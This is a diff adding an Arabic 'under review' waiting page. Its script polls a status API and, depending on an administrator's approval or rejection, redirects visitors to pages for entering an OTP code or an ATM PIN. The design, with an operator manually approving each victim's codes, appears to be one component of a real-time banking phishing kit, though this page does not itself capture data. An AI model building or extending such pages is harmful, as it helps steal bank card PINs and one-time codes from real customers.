@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>جاري المراجعة</title>
+  <style>
+    body {
+      margin: 0;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #f5f7fb;
+      font-family: Arial, sans-serif;
+    }
+    .box {
+      background: #fff;
+      border-radius: 18px;
+      width: min(92vw, 480px);
+      box-shadow: 0 18px 40px rgba(15, 23, 42, 0.08);
+      padding: 30px 24px;
+      text-align: center;
+    }
+    .spinner {
+      width: 52px;
+      height: 52px;
+      margin: 0 auto 18px;
+      border: 5px solid #e5e7eb;
+      border-top-color: #0d6efd;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    h2 {
+      margin: 0 0 10px;
+      color: #1f2937;
+      font-size: 1.8rem;
+    }
+    p {
+      margin: 0;
+      color: #6b7280;
+      line-height: 1.7;
+      font-size: 1rem;
+    }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <div class="spinner"></div>
+    <h2>جاري المراجعة</h2>
+    <p>يرجى الانتظار، سيتم نقلك تلقائيًا عند قرار الإدارة.</p>
+  </div>
+
+  <script>
+    (function(){
+      var params = new URLSearchParams(window.location.search);
+      var requestId = params.get('id');
+      var type = params.get('type') || 'otp';
+      if (!requestId) {
+        window.location.href = 'index.html';
+        return;
+      }
+
+      var interval = setInterval(function(){
+        fetch('/api/status/' + requestId)
+          .then(function(res){ return res.json(); })
+          .then(function(data){
+            if (!data || !data.status) return;
+            var status = String(data.status).trim().toLowerCase();
+            if (status === 'approved') {
+              clearInterval(interval);
+              if (type === 'atm') {
+                window.location.href = 'success.html?id=' + requestId;
+              } else {
+                window.location.href = 'atm.html?id=' + requestId;
+              }
+              return;
+            }
+            if (status === 'rejected') {
+              clearInterval(interval);
+              if (type === 'atm') {
+                var msg = 'تم رفض الرقم السري. يرجى التحقق من البيانات والمحاولة مرة أخرى.';
+                window.location.href = 'atm.html?error=atm&msg=' + encodeURIComponent(msg) + '&id=' + requestId;
+              } else {
+                var otpMsg = 'تم رفض رمز التحقق. يرجى التحقق من الرمز والمحاولة مرة أخرى.';
+                window.location.href = 'otp.html?error=otp&msg=' + encodeURIComponent(otpMsg) + '&id=' + requestId;
+              }
+            }
+          })
+          .catch(function(){});
+      }, 2000);
+    })();
+  </script>
+</body>
+</html>
